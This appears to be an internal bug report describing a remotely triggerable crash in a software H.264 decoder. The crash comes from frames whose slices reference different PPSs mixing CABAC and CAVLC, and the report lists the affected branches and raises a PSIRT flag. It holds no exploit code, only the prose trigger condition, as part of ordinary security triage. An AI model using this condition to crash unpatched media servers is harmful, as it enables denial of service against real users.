Description: crash when decoding an h264 bitstream that appears to mix CABAC and CAVLC in a single frameOur software H264 decoder and parser will crash when a frame has two slices that reference different PPSs, one using CABAC and one using CAVLC.Per the spec this is illegal - firstly all slices need to use the same PPS ID ;When present, the value of the slice header syntax elements pic_parameter_set_id [...] shall be the same in all slice headers of a coded picture.;.  Secondly, you can't update the PPS for a given ID mid-frame ;Any picture parameter set NAL unit containing the value of pic_parameter_set_id for the active picture parameter set RBSP for a coded picture shall have the same content as that of the active picture parameter set RBSP for the coded picture unless it follows the last VCL NAL unit of the coded picture and precedes the first VCL NAL unit of another coded picture.;  Our decoders enforce the second of these but not the first.Our GPU decoder isn't affected - but X-series still isn't immune because it uses the affected software H264 parser.Issue exposed by mediatest / mf_stress and also noticed by Bedfont.  Our h264 encoder can now switch between CABAC and CAVLC and that can trigger this issue when combined with the bitstream corruption of mf_stress.Affects all current CMS branches plus client_release_1_9.  Darling doesn't use the software decoder or parser but it's not a bad idea to check what happens with a bad bitstream.Setting the PSIRT flag since a rogue endpoint could crash CMS media processes at will with this.
